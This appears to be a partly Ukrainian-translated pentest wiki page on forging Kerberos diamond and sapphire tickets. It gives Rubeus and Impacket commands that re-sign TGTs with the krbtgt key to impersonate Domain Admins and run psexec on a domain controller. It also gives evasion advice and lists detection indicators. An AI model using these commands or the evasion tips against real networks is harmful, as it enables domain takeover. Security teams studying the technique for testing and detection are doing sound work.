# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Like a golden ticket**, a diamond ticket is a TGT which can be used to **access any service as any user**. A golden ticket is forged completely offline, encrypted with the krbtgt hash of that domain, and then passed into a logon session for use. Because domain controllers don't track TGTs it (or they) have legitimately issued, they will happily accept TGTs that are encrypted with its own krbtgt hash.

There are two common techniques to detect the use of golden tickets:

- Look for TGS-REQs that have no corresponding AS-REQ.
- Look for TGTs that have silly values, such as Mimikatz's default 10-year lifetime.

A **diamond ticket** is made by **modifying the fields of a legitimate TGT that was issued by a DC**. This is achieved by **requesting** a **TGT**, **decrypting** it with the domain's krbtgt hash, **modifying** the desired fields of the ticket, then **re-encrypting it**. This **overcomes the two aforementioned shortcomings** of a golden ticket because:

- TGS-REQs will have a preceding AS-REQ.
- The TGT was issued by a DC which means it will have all the correct details from the domain's Kerberos policy. Even though these can be accurately forged in a golden ticket, it's more complex and open to mistakes.

### Вимоги та робочий процес

- **Cryptographic material**: the krbtgt AES256 key (preferred) or NTLM hash in order to decrypt and re-sign the TGT.
- **Legitimate TGT blob**: obtained with `/tgtdeleg`, `asktgt`, `s4u`, or by exporting tickets from memory.
- **Context data**: the target user RID, group RIDs/SIDs, and (optionally) LDAP-derived PAC attributes.
- **Service keys** (only if you plan to re-cut service tickets): AES key of the service SPN to be impersonated.

1. Отримати TGT для будь-якого контрольованого користувача через AS-REQ (Rubeus `/tgtdeleg` зручно, оскільки він примушує клієнта виконати Kerberos GSS-API dance без облікових даних).
2. Розшифрувати повернений TGT за допомогою krbtgt key, виправити PAC атрибути (user, groups, logon info, SIDs, device claims тощо).
3. Повторно зашифрувати/підписати ticket тим самим krbtgt key і інжектувати його в поточну сесію входу (`kerberos::ptt`, `Rubeus.exe ptt`...).
4. Опційно, повторити процес для service ticket, подавши дійсний TGT blob плюс потрібний service key, щоб залишатися більш прихованим у мережевому трафіку.

### Updated Rubeus tradecraft (2024+)

Recent work by Huntress modernized the `diamond` action inside Rubeus by porting the `/ldap` and `/opsec` improvements that previously only existed for golden/silver tickets. `/ldap` now auto-populates accurate PAC attributes straight from AD (user profile, logon hours, sidHistory, domain policies), while `/opsec` makes the AS-REQ/AS-REP flow indistinguishable from a Windows client by performing the two-step pre-auth sequence and enforcing AES-only crypto. This dramatically reduces obvious indicators such as blank device IDs or unrealistic validity windows.
```powershell
# Query RID/context data (PowerView/SharpView/AD modules all work)
Get-DomainUser -Identity <username> -Properties objectsid | Select-Object samaccountname,objectsid

# Craft a high-fidelity diamond TGT and inject it
./Rubeus.exe diamond /tgtdeleg \
/ticketuser:svc_sql /ticketuserid:1109 \
/groups:512,519 \
/krbkey:<KRBTGT_AES256_KEY> \
/ldap /ldapuser:MARVEL\loki /ldappassword:Mischief$ \
/opsec /nowrap
```
- `/ldap` (with optional `/ldapuser` & `/ldappassword`) запитує AD та SYSVOL, щоб віддзеркалити дані політики PAC цільового користувача.
- `/opsec` примушує виконати Windows-подібний повтор AS-REQ, обнуляючи шумні прапори й дотримуючись AES256.
- `/tgtdeleg` утримує ваші руки подалі від пароля у відкритому вигляді або ключа NTLM/AES жертви, при цьому все ще повертає дешифровуваний TGT.

### Service-ticket recutting

Те ж оновлення Rubeus додало можливість застосувати diamond technique до TGS blobs. Підгодувавши `diamond` **base64-encoded TGT** (from `asktgt`, `/tgtdeleg`, or a previously forged TGT), the **service SPN**, and the **service AES key**, ви можете створювати реалістичні service tickets, не торкаючись KDC — фактично більш прихований silver ticket.
```powershell
./Rubeus.exe diamond \
/ticket:<BASE64_TGT_OR_KRB-CRED> \
/service:cifs/dc01.lab.local \
/servicekey:<AES256_SERVICE_KEY> \
/ticketuser:svc_sql /ticketuserid:1109 \
/ldap /opsec /nowrap
```
Цей робочий процес ідеально підходить, коли ви вже контролюєте service account key (наприклад, витягнутий за допомогою `lsadump::lsa /inject` або `secretsdump.py`) і хочете створити одноразовий TGS, який ідеально відповідає політиці AD, часовим рамкам та даним PAC без генерації нового AS/TGS трафіку.

### Sapphire-style PAC swaps (2025)

A newer twist sometimes called a **sapphire ticket** combines Diamond's "real TGT" base with **S4U2self+U2U** to steal a privileged PAC and drop it into your own TGT. Instead of inventing extra SIDs, you request a U2U S4U2self ticket for a high-privilege user, extract that PAC, and splice it into your legitimate TGT before re-signing with the krbtgt key. Because U2U sets `ENC-TKT-IN-SKEY`, the resulting wire flow looks like a legitimate user-to-user exchange.

Мінімальне відтворення на стороні Linux з патченою версією Impacket `ticketer.py` (додає підтримку sapphire):
```bash
python3 ticketer.py -request -impersonate 'DAuser' \
-domain 'lab.local' -user 'lowpriv' -password 'Passw0rd!' \
-aesKey '<krbtgt_aes256>' -domain-sid 'S-1-5-21-111-222-333' \
--u2u --s4u2self
# inject resulting .ccache
export KRB5CCNAME=lowpriv.ccache
python3 psexec.py lab.local/DAuser@dc.lab.local -k -no-pass
```
Ключові OPSEC-показники при використанні цього варіанту:

- TGS-REQ буде містити `ENC-TKT-IN-SKEY` і `additional-tickets` (TGT жертви) — рідко зустрічається в нормальному трафіку.
- `sname` часто дорівнює користувачу, що робить запит (self-service access), і Event ID 4769 показує викликача та ціль як той самий SPN/користувач.
- Очікуйте парні записи 4768/4769 з тим самим клієнтським комп'ютером, але різними CNAMES (запитувач з низькими привілеями проти привілейованого власника PAC).

### OPSEC & нотатки щодо виявлення

- Традиційні heuristics мисливця (TGS without AS, decade-long lifetimes) все ще застосовуються до golden tickets, але diamond tickets переважно виявляються коли **вміст PAC або відображення груп виглядає неможливим**. Заповніть кожне поле PAC (logon hours, user profile paths, device IDs), щоб автоматичні порівняння не відразу помітили підробку.
- **Do not oversubscribe groups/RIDs**. Якщо вам потрібні лише `512` (Domain Admins) і `519` (Enterprise Admins), зупиніться на цьому й переконайтеся, що цільовий обліковий запис правдоподібно належить до цих груп в AD. Надмірні `ExtraSids` видають підробку.
- Sapphire-style swaps залишають U2U відбитки: `ENC-TKT-IN-SKEY` + `additional-tickets` + `sname == cname` у 4769, а також подальший логон 4624, що походить від підробленого квитка. Корелюйте ці поля замість того, щоб шукати лише пропуски no-AS-REQ.
- Microsoft почала поетапно відмовлятися від **RC4 service ticket issuance** через CVE-2026-20833; примусове застосування AES-only etypes на KDC одночасно зміцнює домен і узгоджується з diamond/sapphire tooling (/opsec вже примушує AES). Змішування RC4 у підроблених PAC усе більше виділятиметься.
- Splunk's Security Content project розповсюджує телеметрію attack-range для diamond tickets та детекції, такі як *Windows Domain Admin Impersonation Indicator*, яка корелює незвичні послідовності Event ID 4768/4769/4624 та зміни груп PAC. Відтворення того набору даних (або генерація власного за допомогою наведених вище команд) допомагає перевірити покриття SOC для T1558.001 і дає конкретну логіку оповіщень для обходу.

## References

- [Huntress – Recutting the Kerberos Diamond Ticket (2025)](https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket)
- [Splunk Security Content – Diamond Ticket attack data & detections (2023)](https://research.splunk.com/attack_data/be469518-9d2d-4ebb-b839-12683cd18a7c/)
- [Хабр – Теневая сторона драгоценностей: Diamond & Sapphire Ticket (2025)](https://habr.com/ru/articles/891620/)
- [Microsoft – RC4 service ticket enforcement for CVE-2026-20833](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
